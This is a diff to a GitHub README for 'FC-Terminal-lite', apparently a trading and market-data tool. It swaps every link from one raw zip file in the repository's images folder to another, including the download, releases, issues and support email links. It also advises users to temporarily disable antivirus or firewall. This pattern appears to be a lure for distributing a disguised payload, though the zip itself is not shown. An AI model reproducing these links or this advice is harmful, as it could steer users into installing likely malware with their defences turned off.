@@ -1,6 +1,6 @@
 # 📈 FC-Terminal-lite - Analyze Market Data Effortlessly
 
-![Download FC-Terminal-lite](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip)
+![Download FC-Terminal-lite](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip)
 
 ## 🌟 Introduction
 
@@ -12,11 +12,11 @@ To start using FC-Terminal-lite, follow these simple steps. You will quickly set
 
 ## 📥 Download & Install
 
-To download FC-Terminal-lite, visit this page: [GitHub Releases Page](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip). 
+To download FC-Terminal-lite, visit this page: [GitHub Releases Page](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip). 
 
 Follow these steps for installation:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip). Here, you will find all available versions of the software.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip). Here, you will find all available versions of the software.
    
 2. **Select the Latest Version**: Look for the most recent release. It will be at the top of the page.
 
@@ -67,15 +67,15 @@ If you encounter issues while downloading or installing FC-Terminal-lite, try th
 2. **Antivirus or Firewall**: Sometimes, these programs may block installations. Temporarily disable them if you face issues.
 3. **Re-download**: If the file seems corrupted, re-download it from the Releases page.
 
-For persistent problems, you can raise an issue on our [GitHub Issues Page](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip).
+For persistent problems, you can raise an issue on our [GitHub Issues Page](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip).
 
 ## 📞 Support
 
 If you need further assistance, feel free to reach out. Our team is here to help you:
 
-- **Email**: https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip
-- **GitHub Issues Page**: Report any issues or feedback directly [here](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip).
+- **Email**: https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip
+- **GitHub Issues Page**: Report any issues or feedback directly [here](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip).
 
 Now that you have all the necessary information, download FC-Terminal-lite today and start enhancing your trading experience!
 
-![Download FC-Terminal-lite Again](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/F_Terminal_lite_2.0.zip)
+![Download FC-Terminal-lite Again](https://github.com/Canbuyukaktas/FC-Terminal-lite/raw/refs/heads/main/images/Terminal_lite_F_1.4.zip)
